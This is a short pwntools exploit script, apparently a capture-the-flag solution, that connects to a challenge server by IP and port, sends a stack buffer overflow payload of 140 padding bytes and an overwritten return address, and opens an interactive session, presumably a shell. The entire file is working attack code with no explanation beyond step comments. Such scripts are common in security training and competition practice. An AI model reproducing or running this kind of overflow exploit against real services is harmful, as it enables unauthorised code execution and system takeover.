from pwn import *

#: Connect to challenge server
HOST = '104.154.106.182' 
PORT = 2345
p = remote(HOST,PORT)
print(p.recv())

#: Exploit code
offset = 'A' * 140
shell = p32(0x80484ad)
exploit = offset + shell

#: Send payload
p.sendline(exploit)
print(p.recv())
p.interactive()
